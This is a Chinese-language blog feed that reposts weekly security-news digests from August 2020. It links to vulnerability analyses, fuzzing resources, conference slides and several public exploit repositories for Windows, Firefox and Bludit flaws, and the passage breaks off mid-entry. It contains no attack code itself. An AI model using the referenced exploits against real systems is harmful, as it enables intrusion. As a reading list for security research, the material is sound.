        <content type="html"><![CDATA[<h1 id="2020-8-3-8-9一周安全知识动态"><a href="#2020-8-3-8-9一周安全知识动态" class="headerlink" title="2020.8.3-8.9一周安全知识动态"></a>2020.8.3-8.9一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•Compromising the macOS Kernel through Safari by Chaining Six Vulnerabilities</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sslab-gatech&#x2F;pwn2own2020Pwn2own2020 macOS利用链</span><br></pre></td></tr></table></figure><p>•0day Exploit Root Cause Analyses</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;p&#x2F;rca.html三个在野0day：CVE-2019-17026(Firefox)、CVE-2020-0674(InternetExplorer)、CVE-2020-6820(Firefox)分析</span><br></pre></td></tr></table></figure><p>•Understanding Web Security Checks in Firefox</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.mozilla.org&#x2F;attack-and-defense&#x2F;2020&#x2F;08&#x2F;05&#x2F;understanding-web-security-checks-in-firefox-part-2&#x2F;firefox中的WebSecurityChecks机制分析</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Exploiting Android Messengers with WebRTC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;08&#x2F;exploiting-android-messengers-part-1.html</span><br><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;08&#x2F;exploiting-android-messengers-part-2.html</span><br><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;08&#x2F;exploiting-android-messengers-part-3.html</span><br><span class="line">通过WebRTC攻击AndroidMessengers</span><br></pre></td></tr></table></figure><p>•Group Policies Going Rogue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cyberark.com&#x2F;resources&#x2F;threat-research-blog&#x2F;group-policies-going-rogueWindowsgroup policy object(GPO) 机制分析以及漏洞挖掘</span><br></pre></td></tr></table></figure><p>•TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secmob&#x2F;TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices梯云纵漏洞资料</span><br></pre></td></tr></table></figure><p>•Breaking Samsung’s Root of Trust: Exploiting Samsung S10 Secure Boot</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;t.co&#x2F;An06bgtX76?amp&#x3D;1blackhat 2020议题《BreakingSamsung&#39;s Root of Trust: Exploiting Samsung S10 Secure Boot》slide</span><br></pre></td></tr></table></figure><p>•iOS Kernel PAC, One Year Later</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bazad.github.io&#x2F;presentations&#x2F;BlackHat-USA-2020-iOS_Kernel_PAC_One_Year_Later.pdfblackhat202议题《iOS Kernel PAC, OneYearLater》slide</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•MMS Exploit Part</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;07&#x2F;mms-exploit-part-1-introduction-to-qmage.html</span><br><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;07&#x2F;mms-exploit-part-2-effective-fuzzing-qmage.html</span><br><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;07&#x2F;mms-exploit-part-3-constructing-primitives.html</span><br><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;08&#x2F;mms-exploit-part-4-completing-aslr-oracle.htmlSamsung image codec</span><br><span class="line">漏洞攻击面分析到漏洞挖掘与利用的过程</span><br></pre></td></tr></table></figure><p>•The danger of world writable NFS shares</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@securityshenaningans&#x2F;the-danger-of-world-writable-nfs-shares-39ecfe868468NFS共享的危害</span><br></pre></td></tr></table></figure><p>•Ghostscript SAFER Sandbox Breakout (CVE-2020-15900)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;insomniasec.com&#x2F;blog&#x2F;ghostscript-cve-2020-15900CVE-2020-15900Ghostscript漏洞分析</span><br></pre></td></tr></table></figure><p>•Path Traversal Vulnerability in SecurEnvoy impacts on remote command execution through file upload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sidechannel.tempestsi.com&#x2F;path-traversal-vulnerability-in-securenvoy-impacts-on-remote-command-execution-through-file-upload-ec2e731bd50aSecurMail上传文件漏洞分析</span><br></pre></td></tr></table></figure><p>•How i find Blind Remote Code Execution vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@viveik.chauhan&#x2F;blind-remote-code-execution-b9c4e119f7c3blind rce分析</span><br></pre></td></tr></table></figure><p>•Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;walmartglobaltech&#x2F;hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77Cisco SD-WAN vManage 19.2.2从csrf到rce漏洞分析</span><br></pre></td></tr></table></figure><p>•Pwn2Own -&gt; Xxe2Rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;muffsec.com&#x2F;blog&#x2F;?p&#x3D;608Pwn2Own上的Xxe到Rce漏洞分析</span><br></pre></td></tr></table></figure><p>•Vulnerabilities in the Openfire Admin Console</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;swarm.ptsecurity.com&#x2F;openfire-admin-console&#x2F;OpenfireAdminConsole漏洞分析</span><br></pre></td></tr></table></figure><p>•AST Injection, Prototype Pollution to RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.p6.is&#x2F;AST-Injection&#x2F;AST注入，原型链漏洞分析</span><br></pre></td></tr></table></figure><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•Don’t be silly – it’s only a lightbulb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;research.checkpoint.com&#x2F;2020&#x2F;dont-be-silly-its-only-a-lightbulb&#x2F;ZigBee照明设备分析</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•Fuzzing afdko with AFL in 32bit Mode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hardik05.wordpress.com&#x2F;2020&#x2F;08&#x2F;08&#x2F;fuzzing-afdko-with-afl-in-32bit-mode&#x2F;通过afl fuzz afdko</span><br></pre></td></tr></table></figure><p>•Capturing memory corruptions with symbolic execution - Introduction to KLEE (part 3)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;XLtoWNbnfK0通过执行进行漏洞挖掘</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•Bypassing internet connectivity and copy-paste restriction to Infiltrating malicious data</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.mannulinux.org&#x2F;2020&#x2F;08&#x2F;bypassing-internet-connectivity-and.html绕过恶意数据传输限制</span><br></pre></td></tr></table></figure><p>•Intel, ARM, IBM, AMD Processors Vulnerable to New Side-Channel Attacks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;modernnetsec.io&#x2F;intel-arm-ibm-amd-processors-vulnerable-to-new-side-channel-attacks&#x2F;对于cpu处理器侧信道攻击的方法</span><br></pre></td></tr></table></figure><p>•Over 400 vulnerabilities on Qualcomm’s Snapdragon chip threaten mobile phones’ usability worldwide</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.checkpoint.com&#x2F;2020&#x2F;08&#x2F;06&#x2F;achilles-small-chip-big-peril&#x2F;DigitalSignal处理器漏洞分析</span><br></pre></td></tr></table></figure><p>•DEFCON 2020 Live Notes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nullsweep.com&#x2F;defcon-2020-live-notes&#x2F;defcon2020会议议题笔记</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.8.17-8.23一周安全知识动态</title>
      <link href="/2020/09/29/%5B%E8%BD%AC%5D2020.8.17-8.23%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%5B%E8%BD%AC%5D2020.8.17-8.23%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-8-17-8-23一周安全知识动态"><a href="#2020-8-17-8-23一周安全知识动态" class="headerlink" title="2020.8.17-8.23一周安全知识动态"></a>2020.8.17-8.23一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•HFL: Hybrid Fuzzing on the Linux Kernel</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;chungkim.io&#x2F;doc&#x2F;ndss20-hfl.pdfNdss2020 linux内核漏洞挖掘论文</span><br></pre></td></tr></table></figure><p>•On Measuring and Visualizing Fuzzer Performance</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hexgolems.com&#x2F;2020&#x2F;08&#x2F;on-measuring-and-visualizing-fuzzer-performance&#x2F;提升fuzzer评估效率的方法</span><br></pre></td></tr></table></figure><p>•Everything Old is New Again: Binary Security of WebAssembly</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.usenix.org&#x2F;system&#x2F;files&#x2F;sec20-lehmann.pdfUsenix2020WebAssembly漏洞论文</span><br></pre></td></tr></table></figure><p>•Responsible and Effective Bugfinding</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.regehr.org&#x2F;archives&#x2F;2037漏洞挖掘的有效方法</span><br></pre></td></tr></table></figure><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•A PRACTICAL GUIDE FOR CRACKING AES-128 ENCRYPTED FIRMWARE UPDATES</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gethypoxic.com&#x2F;blogs&#x2F;technical&#x2F;a-practical-guide-for-cracking-aes-128-encrypted-firmware-updates实战破解AES-128加密的固件升级包</span><br></pre></td></tr></table></figure><p>•Breaking the D-Link DIR3060 Firmware Encryption - Recon - Part 1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;0x434b.dev&#x2F;breaking-the-d-link-dir3060-firmware-encryption-recon-part-1&#x2F;D-Link DIR3060固件加密解析</span><br></pre></td></tr></table></figure><h3 id="漏洞利用相关"><a href="#漏洞利用相关" class="headerlink" title="漏洞利用相关"></a>漏洞利用相关</h3><p>•Buffer-Overflow-Exploit-Development-Practice</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;freddiebarrsmith&#x2F;Buffer-Overflow-Exploit-Development-Practice栈溢出实战练习仓库</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•SassyKitdi: Kernel Mode TCP Sockets + LSASS Dump</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zerosum0x0.blogspot.com&#x2F;2020&#x2F;08&#x2F;sassykitdi-kernel-mode-tcp-sockets.htmlwindows通用kernel payload</span><br></pre></td></tr></table></figure><p>•CVE-2020-1571 Windows Setup Elevation of Privileges Bypass 0day</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;klinix5&#x2F;Windows-Setup-EoPCVE-2020-1571 windows提权漏洞exp</span><br></pre></td></tr></table></figure><p>•Windows AppX Deployment Service Local Privilege Escalation (CVE-2020-1488)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.activecyber.us&#x2F;activelabs&#x2F;windows-appx-deployment-service-local-privilege-escalation-cve-2020-1488CVE-2020-1488WindowsAppXDeployment服务提权漏洞分析</span><br></pre></td></tr></table></figure><p>•BLIZZARD JAILBREAK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;geosn0w.github.io&#x2F;getblizzard&#x2F;开源的越狱工具IOS 11.0至 IOS 13.5</span><br></pre></td></tr></table></figure><p>•CVE-2020-1337: my two cents</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.hiveminds.es&#x2F;en&#x2F;posts&#x2F;cve-2020-1337_my_two_cents&#x2F;CVE-2020-1337漏洞分析</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•List of bug bounty writeups</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pentester.land&#x2F;list-of-bug-bounty-writeups.html#bug-bounty-writeups-published-in-2020bounty 报告</span><br></pre></td></tr></table></figure><p>•Bludit Auth BF mitigation bypass exploit / PoC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;noraj&#x2F;Bludit-auth-BF-bypassExploit&#x2F; PoCfor CVE-2019-17240</span><br></pre></td></tr></table></figure><p>•Understanding and Preventing LDAP Injection</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.securecoding.com&#x2F;understanding-and-preventing-ldap-injection&#x2F;LDAP注入及防御机制分析</span><br></pre></td></tr></table></figure><p>•A SmorgasHORDE of Vulnerabilities :: A Comparative Analysis of Discovery</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;srcincite.io&#x2F;blog&#x2F;2020&#x2F;08&#x2F;19&#x2F;a-smorgashorde-of-vulnerabilities-a-comparative-analysis-of-discovery.htmlSmorgasHORDE漏洞挖掘分析</span><br></pre></td></tr></table></figure><p>•Struts2 S2-059 漏洞分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wxn.qq.com&#x2F;cmsid&#x2F;20200816A03TC200</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•PowerShell Commands for Incident Response</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.securityinbits.com&#x2F;incident-response&#x2F;powershell-commands-for-incident-response&#x2F;powershell 奇淫技巧命令</span><br></pre></td></tr></table></figure><p>•Why you should always scan UDP ports (part 1/2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@securityshenaningans&#x2F;why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727扫描UDP端口的作用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.8.24-8.30一周安全知识动态</title>
      <link href="/2020/09/29/%5B%E8%BD%AC%5D2020.8.24-8.30%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%5B%E8%BD%AC%5D2020.8.24-8.30%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-8-24-8-30一周安全知识动态"><a href="#2020-8-24-8-30一周安全知识动态" class="headerlink" title="2020.8.24-8.30一周安全知识动态"></a>2020.8.24-8.30一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•CVE-2020-10611: ACHIEVING CODE EXECUTION ON THE TRIANGLE MICROWORKS SCADA DATA GATEWAY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;blog&#x2F;2020&#x2F;8&#x2F;24&#x2F;cve-2020-10611-achieving-code-execution-on-the-triangle-microworks-scada-data-gatewayCVE-2020-10611TriangleMicroWorks SCADA DataGateway RCE漏洞分析</span><br></pre></td></tr></table></figure><p>•CISCO ISE &lt; 1.5 PASSWORDS DECRYPTION</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.synacktiv.com&#x2F;publications&#x2F;cisco-ise-15-passwords-decryption.htmlCisco ISE &lt; 1.5密码解密分析</span><br></pre></td></tr></table></figure><p>•Forget Your Perimeter: RCE in Pulse Connect Secure (CVE-2020-8218)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.gosecure.net&#x2F;blog&#x2F;2020&#x2F;08&#x2F;26&#x2F;forget-your-perimeter-rce-in-pulse-connect-secure&#x2F;PulseConnectSecure RCE漏洞CVE-2020-8218分析</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•js-fuzzer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;source.chromium.org&#x2F;chromium&#x2F;chromium&#x2F;src&#x2F;+&#x2F;master:v8&#x2F;tools&#x2F;clusterfuzz&#x2F;js_fuzzer&#x2F;新开源的JS-Fuzzer</span><br></pre></td></tr></table></figure><p>•Improving Coverage Guided Fuzzing, Using Static Analysis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;repret.wordpress.com&#x2F;2017&#x2F;05&#x2F;01&#x2F;improving-coverage-guided-fuzzing-using-static-analysis&#x2F;使用静态分析来提升CoverageGuidedFuzzing</span><br></pre></td></tr></table></figure><p>•Fuzzing the Linux kernel (x86) entry code, Part 1 of 3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blogs.oracle.com&#x2F;linux&#x2F;fuzzing-the-linux-kernel-x86-entry-code%2c-part-1-of-3fuzz linux内核系列文章</span><br></pre></td></tr></table></figure><p>•Damn_Vulnerable_C_Program</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hardik05&#x2F;Damn_Vulnerable_C_Program用来学习AFL漏洞挖掘的demo</span><br></pre></td></tr></table></figure><p>• AFL fuzz系列教程及视频</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hardik05.wordpress.com&#x2F;tag&#x2F;afl&#x2F;</span><br></pre></td></tr></table></figure><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•Cleanly Escaping the Chrome Sandbox</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;theori.io&#x2F;research&#x2F;escaping-chrome-sandbox&#x2F;Issue1062091沙箱逃逸漏洞分析</span><br></pre></td></tr></table></figure><p>•JavaScript Engine Fuzzing and Exploitation Reading List</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zon8.re&#x2F;posts&#x2F;javascript-engine-fuzzing-and-exploitation-reading-list&#x2F;javascript fuzz以及漏洞利用相关资源</span><br></pre></td></tr></table></figure><p>•Stealing local files using Safari Web Share API</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.redteam.pl&#x2F;2020&#x2F;08&#x2F;stealing-local-files-using-safari-web.html使用safari浏览器WebShare API获取本地文件</span><br></pre></td></tr></table></figure><p>•CVE-2019-17026-Exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;maxpl0it&#x2F;CVE-2019-17026-Exploithttps:&#x2F;&#x2F;labs.f-secure.com&#x2F;blog&#x2F;exploiting-cve-2019-17026-a-firefox-jit-bug&#x2F;CVE-2019-17026- Firefox JIT 漏洞exp及分析</span><br></pre></td></tr></table></figure><p>•CVE-2020-1380: Analysis of Recently Fixed IE Zero-Day</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.trendmicro.com&#x2F;en_us&#x2F;research&#x2F;20&#x2F;h&#x2F;cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.htmlCVE-2020-1380 IE漏洞分析</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•Demystifying Insecure Deserialization in PHP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;bugbountywriteup&#x2F;demystifying-insecure-deserialization-in-php-684cab9c4d24PHP反序列化研究</span><br></pre></td></tr></table></figure><p>•LEARNING ABOUT STRUCTURE-AWARE FUZZING AND FINDING JSON BUGS TO BOOT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.forallsecure.com&#x2F;learning-about-structure-aware-fuzzing-and-finding-json-bugs-to-boot?utm_content&#x3D;138198210&amp;utm_medium&#x3D;social&amp;utm_source&#x3D;twitter&amp;hss_channel&#x3D;tw-1568510322Json漏洞挖掘</span><br></pre></td></tr></table></figure><p>•Grafana &lt;= 6.4.3 Arbitrary File Read</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;swarm.ptsecurity.com&#x2F;grafana-6-4-3-arbitrary-file-read&#x2F;Grafana&lt;&#x3D; 6.4.3任意文件读漏洞分析</span><br></pre></td></tr></table></figure><p>•Now you C me, now you don’t: An introduction to the hidden attack surface of interpreted languages</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securitylab.github.com&#x2F;research&#x2F;now-you-c-me解释型语言攻击面分析</span><br></pre></td></tr></table></figure><p>•IDS Bypass contest at PHDays: writeup and solutions</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;blog.ptsecurity.com&#x2F;2019&#x2F;07&#x2F;ids-bypass-contest-at-phdays-writeup.html?fbclid&#x3D;IwAR2-v_v_NcjWYJ9iVvcc1yWAt3pyMKnzboV622QMI9NI3CKYyqn6HIRrjZ8入侵检测系统绕过方法总结</span><br></pre></td></tr></table></figure><p>•Remote Code Execution in Slack desktop apps + bonus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hackerone.com&#x2F;reports&#x2F;783877Slack远程命令执行漏洞</span><br></pre></td></tr></table></figure><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•A Tale of Escaping a Hardened Docker container</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.redtimmy.com&#x2F;docker&#x2F;a-tale-of-escaping-a-hardened-docker-container&#x2F;Docker container逃逸漏洞分析</span><br></pre></td></tr></table></figure><p>•Oracle VirtualBox VBoxVHWAHandleTable Out-Of-Bounds Access Privilege Escalation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;starlabs.sg&#x2F;advisories&#x2F;20-2682&#x2F;CVE-2020-2682 OOB越界提权漏洞</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Part 2: Step-by-step iPhone Setup for iOS Research</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 